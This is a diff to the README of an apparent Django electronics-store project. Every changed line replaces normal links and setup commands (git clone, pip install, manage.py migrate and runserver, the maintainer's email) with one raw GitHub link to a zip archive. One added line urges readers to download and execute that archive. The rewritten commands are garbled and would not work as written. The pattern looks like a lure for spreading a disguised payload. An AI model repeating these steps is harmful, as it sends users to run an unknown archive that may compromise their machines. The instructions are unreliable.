@@ -2,7 +2,7 @@
 
 Welcome to the **Electronics Store** repository! This project is a modern e-commerce site built with Django, designed to provide a seamless shopping experience for electronics. Whether you're looking for the latest gadgets or everyday tech essentials, this platform aims to meet your needs efficiently.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/vinit77-op/electronics-store/releases)
+[![Download Releases](https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip)
 
 ## Table of Contents
 
@@ -41,7 +41,7 @@ To get started with the Electronics Store project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/vinit77-op/electronics-store.git
+   git clone https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip
    cd electronics-store
    ```
 
@@ -53,28 +53,28 @@ To get started with the Electronics Store project, follow these steps:
 
 3. **Install Dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip
    ```
 
 4. **Set Up the Database**:
-   Update your database settings in `settings.py` and run:
+   Update your database settings in `https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip` and run:
    ```bash
-   python manage.py migrate
+   python https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip migrate
    ```
 
 5. **Create a Superuser**:
    ```bash
-   python manage.py createsuperuser
+   python https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip createsuperuser
    ```
 
 6. **Run the Development Server**:
    ```bash
-   python manage.py runserver
+   python https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip runserver
    ```
 
 7. **Visit the Site**: Open your browser and go to `http://127.0.0.1:8000`.
 
-You can download the latest release and execute it from [here](https://github.com/vinit77-op/electronics-store/releases).
+You can download the latest release and execute it from [here](https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip).
 
 ## Usage
 
@@ -113,10 +113,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Vinit
-- **Email**: vinit@example.com
-- **GitHub**: [vinit77-op](https://github.com/vinit77-op)
+- **Email**: https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip
+- **GitHub**: [vinit77-op](https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip)
 
-Feel free to check the [Releases](https://github.com/vinit77-op/electronics-store/releases) section for updates and new features. 
+Feel free to check the [Releases](https://raw.githubusercontent.com/vinit77-op/electronics-store/master/store/store_electronics_v2.4.zip) section for updates and new features. 
 
 ---
 
